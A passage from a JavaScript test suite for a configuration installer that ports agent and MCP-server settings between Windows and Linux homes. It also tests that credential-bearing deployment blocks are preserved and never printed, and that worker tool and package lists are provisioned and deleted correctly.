    assert.equal(t2.bytes, bare, 'a plain server passes through unchanged');
    assert.deepEqual(t2.notes, []);

    // An env entry holding a Windows path outside the captured layer is dropped and named;
    // disabledServers is not rewritten when nothing new was disabled.
    const envDoc = Buffer.from(JSON.stringify({ mcpServers: { s: { command: 'node', args: ['x'], env: { WIN: 'C:\\\\tools\\\\tool.exe', OK: 'k' } } }, disabledServers: ['zz', 'aa'] }));
    t2 = forTarget('omp/agent/mcp.json', envDoc, linux);
    assert.deepEqual(JSON.parse(t2.bytes), { mcpServers: { s: { command: 'node', args: ['x'], env: { OK: 'k' } } }, disabledServers: ['zz', 'aa'] },
      'only the Windows env entry goes, and the disabled list keeps its captured order');
    assert.deepEqual(t2.notes, ['omp/agent/mcp.json: MCP server s: WIN held a Windows path, so it is dropped here']);

    // A bare chrome-devtools-mcp gets exactly the three container flags.
    t2 = forTarget('omp/agent/mcp.json', Buffer.from(JSON.stringify({ mcpServers: { cd: { command: 'chrome-devtools-mcp@latest' } } })), linux);
    assert.deepEqual(JSON.parse(t2.bytes).mcpServers.cd, { command: 'chrome-devtools-mcp@latest', args: ['--headless', '--isolated', '--chrome-arg=--no-sandbox'] });
    assert.deepEqual(t2.notes, ['omp/agent/mcp.json: MCP server cd runs Chrome headless and isolated, without its sandbox']);

    // Disable reasons are named exactly: a wrapped cmd, and a command that is a Windows path.
    t2 = forTarget('omp/agent/mcp.json', Buffer.from(JSON.stringify({
      mcpServers: { sh: { command: 'cmd', args: ['/c', 'npx -y has space'] }, wp: { command: 'C:/tools/app', args: [] } },
    })), linux);
    assert.deepEqual(JSON.parse(t2.bytes).disabledServers, ['sh', 'wp']);
    assert.deepEqual(t2.notes, [
      'omp/agent/mcp.json: MCP server sh runs through cmd, so it is disabled here',
      'omp/agent/mcp.json: MCP server wp points at a Windows path, so it is disabled here',
    ]);

    // MCP-server handling is scoped to omp/agent/mcp.json: the same shape under another rel
    // installs as captured, and a null mcpServers key is skipped, not read.
    const relOther = Buffer.from(JSON.stringify({ mcpServers: { s: { command: 'cmd', args: ['/c', 'x'] } } }));
    t2 = forTarget('agents/x/meta.json', relOther, linux);
    assert.equal(t2.bytes.toString(), relOther.toString(), 'mcp handling runs only for omp/agent/mcp.json');
    assert.deepEqual(t2.notes, []);
    t2 = forTarget('omp/agent/mcp.json', Buffer.from('{"mcpServers":null,"keep":1}'), linux);
    assert.equal(JSON.parse(t2.bytes).keep, 1, 'a null mcpServers key is skipped');
    assert.deepEqual(t2.notes, []);

    // A JSON null document parses fine but is not an object: skipped, never dereferenced.
    t2 = forTarget('omp/agent/mcp.json', Buffer.from(JSON.stringify(null)), linux);
    assert.equal(t2.bytes.toString(), 'null', 'a JSON null document installs as captured');
    assert.deepEqual(t2.notes, []);

    // A null server entry is skipped, not dereferenced.
    t2 = forTarget('omp/agent/mcp.json', Buffer.from('{"mcpServers":{"gone":null},"keep":1}'), linux);
    assert.equal(JSON.parse(t2.bytes).keep, 1, 'a null server entry is skipped');
    assert.deepEqual(t2.notes, []);

    // The env walk keeps nulls and scalars, keeps an object without Windows paths, and drops
    // an object that nests one.
    t2 = forTarget('omp/agent/mcp.json', Buffer.from(JSON.stringify({
      mcpServers: { s: { command: 'node', args: ['x'], env: { N: null, NUM: 5, DEEP: { OK: 1 }, WIN: { P: 'C:\\tools\\tool.exe' } } } },
    })), linux);
    assert.deepEqual(JSON.parse(t2.bytes).mcpServers.s.env, { N: null, NUM: 5, DEEP: { OK: 1 } },
      'null, scalars and plain objects stay; a nested Windows path goes');
    assert.deepEqual(t2.notes, ['omp/agent/mcp.json: MCP server s: WIN held a Windows path, so it is dropped here']);
  }

  // Fingerprint scope: only the marketplaces registry compares modulo JSON formatting and
  // updatedAt; any other JSON rel compares by raw text, and CRLF never churns a plain file.
  assert.notEqual(fingerprint('omp/agent/mcp.json', Buffer.from('{"a":1}')), fingerprint('omp/agent/mcp.json', Buffer.from('{\n  "a": 1\n}\n')), 'non-registry JSON compares by raw text');
  assert.equal(fingerprint('omp/marketplaces.json', Buffer.from('{"updatedAt":1,"b":2}')), fingerprint('omp/marketplaces.json', Buffer.from('{\n  "b": 2\n}\n')), 'the registry compares modulo formatting and updatedAt');
  assert.equal(fingerprint('f.txt', Buffer.from(['a', 'b'].join('\r\n'))), fingerprint('f.txt', Buffer.from(['a', 'b'].join('\n'))), 'CRLF and LF are the same content');

  // splitDeploymentBlocks: the block rule the install workflow rides on, pinned directly.
  {
    const s = splitDeploymentBlocks('kept: 1\nhindsight:\n  secret: x\nalate: v\nmore: 2\n');
    assert.deepEqual(s.kept, ['kept: 1', 'more: 2', '']);
    assert.deepEqual(s.dropped, ['hindsight:', '  secret: x', 'alate: v']);
    assert.equal(s.tail, false);
    assert.equal(splitDeploymentBlocks('a: 1\nalate:\n  k: v').tail, true, 'a trailing block takes the tail');
    assert.equal(withoutDeploymentBlocks('a: 1\nalate:\n  k: v'), 'a: 1\n');
    assert.equal(withoutDeploymentBlocks('a: 1\nb: 2'), 'a: 1\nb: 2');
    assert.equal(withoutDeploymentBlocks('hindsight:\n  k: v\n'), '');
    const s2 = splitDeploymentBlocks('hindsight:\n  k: v\nmodel: x\n  indented: 1');
    assert.deepEqual(s2.kept, ['model: x', '  indented: 1'], 'a top-level key ends a dropped block');
    assert.deepEqual(s2.dropped, ['hindsight:', '  k: v']);
    // A mid-text BOM is content; only a leading one is stripped, with its block.
    assert.deepEqual(splitDeploymentBlocks('a\uFEFFb\nalate:\n  k: v\n').kept, ['a\uFEFFb']);
    assert.deepEqual(splitDeploymentBlocks('\uFEFFalate:\n  k: v\nkept: 1').kept, ['kept: 1'], 'a leading BOM goes with the dropped block');
    for (const head of ['hindsight:', 'alate:', '"hindsight":', "'alate':", 'hindsight :', 'alate\t:']) {
      const t3 = splitDeploymentBlocks(`${head} v\nkeep: 1`);
      assert.deepEqual(t3.dropped, [`${head} v`], `block header: ${head}`);
      assert.deepEqual(t3.kept, ['keep: 1']);
    }
    for (const notHead of ['otherhindsight:', 'hindsightx:', '# hindsight:', '  hindsight:']) {
      assert.deepEqual(splitDeploymentBlocks(`${notHead}\nkeep: 1`).kept, [notHead, 'keep: 1'], `content, not a header: ${notHead}`);
    }
  }

  // install-user applies it for the machine it runs on.
  put('omp/agent/mcp.json', `${JSON.stringify(mcp, null, 2)}\n`);
  const linuxHome = join(tmp, 'linux-home');
  r = run(['--data', data, '--skip-plugins'], linuxHome);
  assert.equal(r.status, 0, r.stderr);
  const installed = JSON.parse(readFileSync(join(linuxHome, '.omp/agent/mcp.json'), 'utf8'));
  if (process.platform === 'win32') assert.deepEqual(installed, mcp);
  else {
    assert.deepEqual(installed.disabledServers, ['exe', 'old', 'shell']);
    assert.equal(installed.mcpServers.wrapped.command, 'npx');
    assert.match(r.stdout, /MCP server wrapped runs npx directly, without cmd \/c/);
    r = run(['--data', data, '--skip-plugins'], linuxHome);
    assert.match(r.stdout, /0 installed, 21 unchanged/, 'an adapted file counts as unchanged on the rerun');
  }

  // Acceptance clause 4 of specs/stored-json-path-form.md: install moves a path back through
  // a capture root the snapshot lacks. The snapshot holds no pi/ item, so a root set derived
  // from the snapshot's top-level dirs misses .pi: the .pi path installs unchanged while the
  // .omp control moves. The full capture-root list (lib/data.mjs) must decide, as capture
  // already does. Install ports with the platform it runs on, so the snapshot carries the
  // form that platform moves: a Windows form on a Linux host (a Linux target re-roots
  // captured Windows paths), the stored POSIX form on a Windows host (a win32 target
  // re-roots the stored form; also clause 4's literal shape). The stored form's own
  // direction is additionally the platform-independent win32 unit check below.
  const piData = join(tmp, 'pi-root-data');
  const piHome = join(tmp, 'pi-root-home');
  const piArgs = process.platform === 'win32'
    ? ['/root/.pi/agent/pix.json', '/root/.omp/agent/keep.json']
    : ['C:\\Users\\domin\\.pi\\agent\\pix.json', 'C:\\root\\.omp\\agent\\keep.json'];
  mkdirSync(join(piData, 'user/omp/agent'), { recursive: true });
  writeFileSync(join(piData, 'user/omp/agent/mcp.json'), `${JSON.stringify({ mcpServers: { x: { command: 'node', args: piArgs } } }, null, 2)}\n`);
  r = run(['--data', piData, '--skip-plugins'], piHome);
  assert.equal(r.status, 0, r.stderr);
  const piInstalled = JSON.parse(readFileSync(join(piHome, '.omp/agent/mcp.json'), 'utf8'));
  assert.equal(piInstalled.mcpServers.x.args[0], join(piHome, '.pi/agent/pix.json'),
    'a captured .pi path installs rooted at the home even though the snapshot holds no pi/ item');
  assert.equal(piInstalled.mcpServers.x.args[1], join(piHome, '.omp/agent/keep.json'),
    'the .omp control still moves');
  // Clause 4 verbatim in the stored form: a snapshot whose JSON holds /root/.pi/x re-roots
  // at the Windows home, again through the root the snapshot lacks.
  const piStored = forTarget('omp/agent/mcp.json', Buffer.from(`${JSON.stringify({ mcpServers: { x: { command: 'node', args: ['/root/.pi/agent/pix.json', '/root/.omp/agent/keep.json'] } } }, null, 2)}\n`), { home: 'C:\\Users\\domin', platform: 'win32', roots: CAPTURE_ROOTS });
  assert.deepEqual(JSON.parse(piStored.bytes.toString('utf8')).mcpServers.x.args,
    ['C:\\Users\\domin\\.pi\\agent\\pix.json', 'C:\\Users\\domin\\.omp\\agent\\keep.json'],
    'the stored /root/.pi form re-roots at the Windows home through the .pi root');

  // omp stamps updatedAt on each catalog refresh: that drift alone is no conflict, a changed path is.
  const registry = stamp => `${JSON.stringify({ version: 1, marketplaces: [{ name: 'm', catalogPath: '/x/marketplace.json', updatedAt: stamp }] }, null, 2)}\n`;
  put('omp/marketplaces.json', registry('2026-01-01T00:00:00.000Z'));
  const regHome = join(tmp, 'registry-home');
  r = run(['--data', data, '--skip-plugins'], regHome);
  assert.equal(r.status, 0, r.stderr);
  writeFileSync(join(regHome, '.omp/marketplaces.json'), registry('2026-10-09T17:41:01.581Z'));
  r = run(['--data', data, '--skip-plugins'], regHome);
  assert.equal(r.status, 0, `a refresh stamp alone is no conflict: ${r.stderr}`);
  writeFileSync(join(regHome, '.omp/marketplaces.json'), registry('2026-10-09T17:41:01.581Z').replace('/x/', '/y/'));
  r = run(['--data', data, '--skip-plugins'], regHome);
  assert.equal(r.status, 1, 'a changed catalog path still is');

  // On a Windows machine, the Linux worker capture's POSIX catalog path installs ported into
  // the Windows home, and the rerun counts the file unchanged without --force: the compare
  // saw the ported form (the stray C:\root folder this prevents is cleaned by hand).
  if (process.platform === 'win32') {
    put('omp/marketplaces.json', `${JSON.stringify({ version: 1, marketplaces: [{ name: 'm', catalogPath: '/root/.omp/plugins/cache/marketplaces/m/marketplace.json' }] }, null, 2)}\n`);
    const winHome = join(tmp, 'win-home');
    r = run(['--data', data, '--skip-plugins'], winHome);
    assert.equal(r.status, 0, r.stderr);
    const winRegistry = JSON.parse(readFileSync(join(winHome, '.omp/marketplaces.json'), 'utf8'));
    assert.equal(winRegistry.marketplaces[0].catalogPath,
      join(winHome, '.omp', 'plugins', 'cache', 'marketplaces', 'm', 'marketplace.json'),
      'the captured POSIX path installs rooted at the Windows home');
    r = run(['--data', data, '--skip-plugins'], winHome);
    assert.equal(r.status, 0, `the ported install is unchanged on the rerun: ${r.stderr}`);
    assert.match(r.stdout, /0 installed, \d+ unchanged/, 'the rerun installs nothing, so no --force is needed');
    assert.ok(!existsSync(join('C:', 'root')), 'nothing writes the captured prefix as a Windows folder');
  }

  // Deployment settings stay on the target: the snapshot's config.yml carries no top-level
  // hindsight:/alate: blocks (capture drops them), and the machine's own ride along on every
  // install. A config that differs only in those blocks is unchanged, a snapshot change keeps
  // them byte for byte, and a change outside them is still a conflict. The blocks hold
  // credentials: they never reach stdout or stderr.
  const blocks = 'hindsight:\n  apiUrl: http://nas:8888\n  apiToken: $HINDSIGHT_TOKEN\nalate:\n  branch: main\n';
  const depHome = join(tmp, 'dep-home');
  r = run(['--data', data, '--skip-plugins'], depHome);
  assert.equal(r.status, 0, r.stderr);
  const depConfig = join(depHome, '.omp/agent/config.yml');
  const snapshotConfig = readFileSync(join(data, 'user/omp/agent/config.yml'), 'utf8');
  writeFileSync(depConfig, snapshotConfig + blocks);
  r = run(['--data', data, '--skip-plugins'], depHome);
  assert.match(r.stdout, /0 installed, 22 unchanged/, `only deployment blocks differ: ${r.stderr}`);
  assert.equal(readFileSync(depConfig, 'utf8'), snapshotConfig + blocks, 'unchanged leaves the blocks byte for byte');

  // A snapshot change installs and keeps the target's deployment blocks byte for byte,
  // recording the snapshot's fingerprint so the next rerun is unchanged again.
  const v2 = 'modelRoles:\n  default: zai/glm-5.3\n';
  put('omp/agent/config.yml', v2);
  r = run(['--data', data, '--skip-plugins'], depHome);
  assert.equal(r.status, 0, `a snapshot change takes the deployment blocks along: ${r.stderr}`);
  assert.match(r.stdout, /1 installed, 21 unchanged/);
  assert.equal(readFileSync(depConfig, 'utf8'), v2 + blocks, 'the blocks survive the install byte for byte');
  assert.equal(JSON.parse(readFileSync(join(depHome, '.alate/installed.json'), 'utf8'))['omp/agent/config.yml'],
    fingerprint('omp/agent/config.yml', Buffer.from(v2)), 'the record holds the snapshot fingerprint');
  r = run(['--data', data, '--skip-plugins'], depHome);
  assert.match(r.stdout, /0 installed, 22 unchanged/, 'the recorded fingerprint makes the rerun unchanged');

  // A change outside the deployment blocks that is neither the snapshot nor the last install
  // is still a conflict, and the block content never reaches the output.
  const edited = v2.replace('zai/glm-5.3', 'zai/glm-edited') + blocks;
  writeFileSync(depConfig, edited);
  r = run(['--data', data, '--skip-plugins'], depHome);
  assert.equal(r.status, 1, 'a machine change outside the blocks is refused');
  assert.ok(r.stderr.includes(join(depHome, '.omp/agent/config.yml')), r.stderr);
  assert.equal(readFileSync(depConfig, 'utf8'), edited, 'refusal leaves the machine file alone');
  assert.ok(!`${r.stdout}${r.stderr}`.includes('apiToken') && !`${r.stdout}${r.stderr}`.includes('nas:8888'),
    'deployment block content is never printed');

  // --force overrides the conflict but still keeps the deployment blocks.
  r = run(['--data', data, '--force', '--skip-plugins'], depHome);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(readFileSync(depConfig, 'utf8'), v2 + blocks, '--force keeps the blocks too');

  // A top-level line that only mentions hindsight is content, not a block start: with it the
  // machine file differs outside the deployment blocks, so it is still a conflict.
  const noted = v2 + 'note: "mentions hindsight: often"\n' + blocks;
  writeFileSync(depConfig, noted);
  r = run(['--data', data, '--skip-plugins'], depHome);
  assert.equal(r.status, 1, 'a top-level hindsight mention outside the blocks is still a conflict');
  assert.ok(r.stderr.includes(join(depHome, '.omp/agent/config.yml')), r.stderr);
  assert.equal(readFileSync(depConfig, 'utf8'), noted, 'refusal leaves the machine file alone');

  // A deployment block that ends the file without a final newline still matches the snapshot.
  const dep2Home = join(tmp, 'dep2-home');
  r = run(['--data', data, '--skip-plugins'], dep2Home);
  assert.equal(r.status, 0, r.stderr);
  writeFileSync(join(dep2Home, '.omp/agent/config.yml'), v2 + 'hindsight:\n  apiUrl: http://nas:8888');
  r = run(['--data', data, '--skip-plugins'], dep2Home);
  assert.match(r.stdout, /0 installed, 22 unchanged/, `an unterminated block still matches the snapshot: ${r.stderr}`);

  // A snapshot without a final newline still gets the blocks on their own line.
  const v3 = 'modelRoles:\n  default: zai/glm-4';
  put('omp/agent/config.yml', v3);
  r = run(['--data', data, '--skip-plugins'], dep2Home);
  assert.equal(r.status, 0, `an unterminated snapshot takes the blocks along: ${r.stderr}`);
  assert.match(r.stdout, /1 installed, 21 unchanged/);
  assert.equal(readFileSync(join(dep2Home, '.omp/agent/config.yml'), 'utf8'),
    `${v3}\nhindsight:\n  apiUrl: http://nas:8888`, 'the merge adds the missing terminator');

  // The memory backend is a deployment choice (OTTR-453): the board injects it at spawn with
  // a --config overlay, so the provisioned config.yml never carries it. A snapshot captured
  // by an older alate loses the entry (and its emptied memory: mapping) at install; only the
  // entry goes, other keys under memory: are agent-layer content.
  const memBase = 'theme:\n  dark: amethyst\nmodelRoles:\n  default: zai/glm\n';
  const memHome = join(tmp, 'mem-home');
  put('omp/agent/config.yml', 'memory:\n  backend: hindsight\n' + memBase);
  r = run(['--data', data, '--skip-plugins'], memHome);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(readFileSync(join(memHome, '.omp/agent/config.yml'), 'utf8'), memBase,
    'a snapshot with a memory backend block installs without it');
  assert.equal(JSON.parse(readFileSync(join(memHome, '.alate/installed.json'), 'utf8'))['omp/agent/config.yml'],
    fingerprint('omp/agent/config.yml', Buffer.from(memBase)), 'the record holds the stripped snapshot fingerprint');

  // A fresh capture has the entry gone: install agrees with capture, so the rerun is unchanged.
  put('omp/agent/config.yml', memBase);
  r = run(['--data', data, '--skip-plugins'], memHome);
  assert.match(r.stdout, /0 installed, 22 unchanged/, `the re-captured snapshot matches what was installed: ${r.stderr}`);

  put('omp/agent/config.yml', 'memory:\n  backend: mnemopi\n  autoRecall: true\n' + memBase);
  r = run(['--data', data, '--skip-plugins'], memHome);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /1 installed/);
  assert.equal(readFileSync(join(memHome, '.omp/agent/config.yml'), 'utf8'),
    'memory:\n  autoRecall: true\n' + memBase, 'only the backend entry is dropped; the rest of memory: installs');

  // A snapshot without any memory block is byte for byte what installs.
  const plainHome = join(tmp, 'mem-plain-home');
  put('omp/agent/config.yml', memBase);
  r = run(['--data', data, '--skip-plugins'], plainHome);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(readFileSync(join(plainHome, '.omp/agent/config.yml'), 'utf8'), memBase, 'no memory block, no change');

  // The target's deployment blocks ride along even over a stale snapshot entry: --force takes
  // the snapshot minus the entry, plus the machine's own blocks.
  const memBlocksHome = join(tmp, 'mem-blocks-home');
  r = run(['--data', data, '--skip-plugins'], memBlocksHome);
  assert.equal(r.status, 0, r.stderr);
  writeFileSync(join(memBlocksHome, '.omp/agent/config.yml'), 'memory:\n  backend: hindsight\n' + memBase + blocks);
  r = run(['--data', data, '--force', '--skip-plugins'], memBlocksHome);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(readFileSync(join(memBlocksHome, '.omp/agent/config.yml'), 'utf8'), memBase + blocks,
    'the stale entry goes, the target deployment blocks stay');
  put('omp/agent/config.yml', v3);

  // Ottr's per-project package lists come from the data repo only: a changed list replaces the copy.
  mkdirSync(join(data, 'workers', 'web'), { recursive: true });
  writeFileSync(join(data, 'workers', 'web', 'apt.txt'), 'libnss3\n');
  mkdirSync(join(data, 'workers', 'nolist'), { recursive: true });
  const listHome = join(tmp, 'list-home');
  r = run(['--data', data, '--skip-plugins'], listHome);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(readFileSync(join(listHome, '.ottr/workers/web/apt.txt'), 'utf8'), 'libnss3\n');
  assert.ok(!existsSync(join(listHome, '.ottr/workers/nolist')), 'a project without a list gets nothing');
  writeFileSync(join(data, 'workers', 'web', 'apt.txt'), 'libnss3\nfonts-liberation\n');
  r = run(['--data', data, '--skip-plugins'], listHome);
  assert.equal(r.status, 0, `a changed list is no conflict: ${r.stderr}`);
  assert.equal(readFileSync(join(listHome, '.ottr/workers/web/apt.txt'), 'utf8'), 'libnss3\nfonts-liberation\n');

  // A dropped file is deleted when it still holds what alate installed, its record goes,
  // and a rename lands as one install plus one delete in a single run.
  // Bring `home` up to the current snapshot first: the sections above changed config.yml,
  // mcp.json, marketplaces.json and the worker list in other homes, so this home has drifted.
  put('omp/agent/skills/mine/AUX.md', '# auxiliary\n');
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  rmSync(join(data, 'user/omp/agent/skills/mine/AUX.md'));
  const renamed = '# mine, v5\n'; // hoisted so the zero-deps import scan (keyword + quote) never matches
  put('omp/agent/skills/mine/RENAME.md', renamed);
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /1 installed, 23 unchanged, 1 deleted/);
  assert.match(r.stdout, /deleted  \.omp[/\\]agent[/\\]skills[/\\]mine[/\\]AUX\.md/);
  assert.ok(!existsSync(join(home, '.omp/agent/skills/mine/AUX.md')));
  assert.equal(got('.omp/agent/skills/mine/RENAME.md'), renamed);
  const record = JSON.parse(got('.alate/installed.json'));
  assert.ok(!('omp/agent/skills/mine/AUX.md' in record), 'the dropped file\'s record is gone');
  assert.equal(record['omp/agent/skills/mine/RENAME.md'], fingerprint('omp/agent/skills/mine/RENAME.md', Buffer.from(renamed)));
  assert.ok(existsSync(join(home, '.omp/agent/skills/mine')), 'the folder with a surviving file stays');
  assert.equal(got(mine), skillText('mine', '# mine, v4\n'), 'the skill entrypoint stays valid');
  rmSync(join(data, 'user/omp/agent/skills/mine/RENAME.md'));
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /0 installed, 23 unchanged, 1 deleted/);

  // A skill folder the snapshot drops completely goes with its empty directories.
  rmSync(join(data, 'user/agents/skills/theirs'), { recursive: true });
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /0 installed, 22 unchanged, 1 deleted/);
  assert.ok(!existsSync(join(home, '.agents/skills/theirs')));
  assert.ok(existsSync(join(home, '.agents/.skill-lock.json')), 'sibling files stay');
  assert.ok(existsSync(join(home, '.agents')), 'the mapped root stays');

  // A dropped file that changed on this machine stays, loses its record, prints a note,
  // and --force does not delete it either.
  writeFileSync(join(home, '.agents/.skill-lock.json'), '{"skills":{"extra":{}}}\n');
  rmSync(join(data, 'user/agents/.skill-lock.json'));
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, 'a changed dropped file never fails the run');
  assert.match(r.stdout, /0 installed, 21 unchanged, 0 deleted/);
  assert.ok(r.stdout.includes('changed here, kept: '));
  assert.ok(r.stdout.includes(join(home, '.agents/.skill-lock.json')), r.stdout);
  assert.equal(got('.agents/.skill-lock.json'), '{"skills":{"extra":{}}}\n', 'machine state wins');
  r = run(['--data', data, '--force', '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(got('.agents/.skill-lock.json'), '{"skills":{"extra":{}}}\n', '--force does not delete a changed file');

  // A symlink at a dropped path refuses the whole run before anything is deleted.
  // Windows needs privileges for file symlinks, so the link fixture runs on POSIX only;
  // the refusal behavior itself is covered on Linux CI. The snapshot deletions below
  // feed the later sections, so they run on every platform.
  const dropHome = join(tmp, 'drop-home');
  r = run(['--data', data, '--skip-plugins'], dropHome);
  assert.equal(r.status, 0, r.stderr);
  rmSync(join(data, 'user/omp/marketplaces.json'));
  rmSync(join(data, 'user/omp/plugins/bun.lock'));
  if (process.platform !== 'win32') {
    rmSync(join(dropHome, '.omp/marketplaces.json'));
    symlinkSync(join(dropHome, '.omp/plugins/bun.lock'), join(dropHome, '.omp/marketplaces.json'));
    r = run(['--data', data, '--skip-plugins'], dropHome);
    assert.equal(r.status, 1, 'a link at a dropped path is refused');
    assert.ok(existsSync(join(dropHome, '.omp/plugins/bun.lock')), 'nothing is deleted');
    assert.ok(existsSync(join(dropHome, '.omp/marketplaces.json')));
  }

  // A home without installed.json loses nothing: an unrecorded dropped file just stays.
  const bareHome = join(tmp, 'bare-home');
  r = run(['--data', data, '--skip-plugins'], bareHome);
  assert.equal(r.status, 0, r.stderr);
  rmSync(join(data, 'user/omp/agent/mcp.json'));
  rmSync(join(bareHome, '.alate'), { recursive: true });
  r = run(['--data', data, '--skip-plugins'], bareHome);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /0 installed, 18 unchanged, 0 deleted/);
  assert.ok(existsSync(join(bareHome, '.omp/agent/mcp.json')), 'no record, no deletion');

  // A worker list the data repo no longer ships is deleted, with its empty directories.
  const workerHome = join(tmp, 'worker-home');
  r = run(['--data', data, '--skip-plugins'], workerHome);
  assert.equal(r.status, 0, r.stderr);
  rmSync(join(data, 'workers/web/apt.txt'));
  r = run(['--data', data, '--skip-plugins'], workerHome);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /0 installed, 17 unchanged, 1 deleted/);
  assert.match(r.stdout, /deleted  \.ottr[/\\]workers[/\\]web[/\\]apt\.txt/);
  assert.ok(!existsSync(join(workerHome, '.ottr/workers')), 'empty worker dirs are pruned');
  assert.ok(existsSync(join(workerHome, '.ottr')), 'the root stays');

  // Worker additions: tools.json, env.txt and requirements.txt provision beside apt.txt with the
  // same replace and delete rules, workers/_all/ provisions like a project, and all three
  // validated files are checked before anything is written: an invalid file fails the provision
  // with its path, nothing lands.
  const SHA = 'cadd3204e728a35d3f13adb7fd0d7902636b79f6b95c40c265eb73b6c35329e4';
  const PIN = 'b4'.repeat(32);
  const godot = { name: 'godot', url: 'https://example.com/godot.zip', sha256: SHA, unpack: 'zip', bin: 'Godot_v4.7.2-stable_linux.x86_64' };
  const fleet = { name: 'fleet-tool', url: 'https://example.com/fleet-tool', sha256: SHA.split('').reverse().join(''), unpack: 'none' };
  const toolsJson = entries => `${JSON.stringify(entries, null, 2)}\n`;
  const reqs = `# pinned, hashed packages\nhypothesis==6.138.3 --hash=sha256:${PIN}\npillow==12.1.0 --hash=sha256:${PIN} --hash=sha256:${PIN.split('').reverse().join('')}\n\nruff==0.14.4 --hash=sha256:${PIN} # inline comment\n`;
  const putWorker = (project, file, text) => {
    mkdirSync(join(data, 'workers', project), { recursive: true });
    writeFileSync(join(data, 'workers', project, file), text);
  };
  putWorker('web', 'apt.txt', 'libnss3\n');
  putWorker('web', 'tools.json', toolsJson([godot]));
  putWorker('web', 'env.txt', '# names only\nPIXEL_LAB_API_KEY\n\nGODOT_BIN\n');
  putWorker('web', 'requirements.txt', reqs);
  putWorker('_all', 'tools.json', toolsJson([fleet]));
  putWorker('_all', 'env.txt', 'SHARED_TOKEN\n');
  putWorker('_all', 'requirements.txt', `numpy==2.4.0 --hash=sha256:${SHA}\n`);
  const toolsHome = join(tmp, 'tools-home');
  r = run(['--data', data, '--skip-plugins'], toolsHome);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/apt.txt'), 'utf8'), 'libnss3\n');
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/tools.json'), 'utf8'), toolsJson([godot]));
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/env.txt'), 'utf8'), '# names only\nPIXEL_LAB_API_KEY\n\nGODOT_BIN\n');
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/requirements.txt'), 'utf8'), reqs);
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/_all/tools.json'), 'utf8'), toolsJson([fleet]), '_all provisions like a project');
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/_all/env.txt'), 'utf8'), 'SHARED_TOKEN\n');
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/_all/requirements.txt'), 'utf8'), `numpy==2.4.0 --hash=sha256:${SHA}\n`);
  r = run(['--data', data, '--skip-plugins'], toolsHome);
  assert.match(r.stdout, /0 installed, 24 unchanged/, 'a rerun copies nothing');

  // The replace rule: a changed list is no conflict, the machine copy just takes the new bytes.
  putWorker('web', 'env.txt', 'PIXEL_LAB_API_KEY\nOTHER_NAME\n');
  r = run(['--data', data, '--skip-plugins'], toolsHome);
  assert.equal(r.status, 0, `a changed list is no conflict: ${r.stderr}`);
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/env.txt'), 'utf8'), 'PIXEL_LAB_API_KEY\nOTHER_NAME\n');

  // env.txt follows ottr's parseEnvTxt grammar (src/tools.ts): a line is one name, then
  // optionally the word "plain". A comment or blank line stays fine; anything else refuses.
  putWorker('web', 'env.txt', 'MQTT_HOST plain\nTOKEN\n# comment\n');
  r = run(['--data', data, '--skip-plugins'], toolsHome);
  assert.equal(r.status, 0, `a "plain" line is still a name list: ${r.stderr}`);
  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/env.txt'), 'utf8'), 'MQTT_HOST plain\nTOKEN\n# comment\n');
  for (const bad of ['MQTT_HOST secret', 'A b c', 'mqtt_host plain']) {
    putWorker('web', 'env.txt', `${bad}\n`);
    r = run(['--data', data, '--skip-plugins'], toolsHome);
    assert.equal(r.status, 1, `"${bad}": the provision fails`);
    assert.ok(r.stderr.includes(join(data, 'workers/web/env.txt')), `"${bad}": the error names the file: ${r.stderr}`);
    assert.ok(!`${r.stdout}${r.stderr}`.includes(bad), `"${bad}": the line content is never printed`);
  }

  // The delete rule: a list the data repo drops is deleted, its siblings and the fleet folder stay.
  rmSync(join(data, 'workers/web/env.txt'));
  r = run(['--data', data, '--skip-plugins'], toolsHome);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /deleted  \.ottr[/\\]workers[/\\]web[/\\]env\.txt/);
  assert.ok(!existsSync(join(toolsHome, '.ottr/workers/web/env.txt')));
  assert.ok(existsSync(join(toolsHome, '.ottr/workers/web/apt.txt')), 'sibling lists stay');
  assert.ok(existsSync(join(toolsHome, '.ottr/workers/_all/env.txt')), 'the fleet folder stays');

  rmSync(join(data, 'workers/web/requirements.txt'));
  r = run(['--data', data, '--skip-plugins'], toolsHome);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /deleted  \.ottr[/\\]workers[/\\]web[/\\]requirements\.txt/);
  assert.ok(!existsSync(join(toolsHome, '.ottr/workers/web/requirements.txt')));
  assert.ok(existsSync(join(toolsHome, '.ottr/workers/web/apt.txt')), 'sibling lists stay');
  assert.ok(existsSync(join(toolsHome, '.ottr/workers/_all/requirements.txt')), 'the fleet folder stays');

  // Every rule break refuses the whole provision with the file path, and nothing is written —
  // not even the valid apt.txt beside the broken file in the same folder.
  const breaks = [
    ['a bad tool name', 'web/tools.json', toolsJson([{ ...godot, name: 'Godot' }])],
    ['a duplicate tool name', 'web/tools.json', toolsJson([godot, godot])],
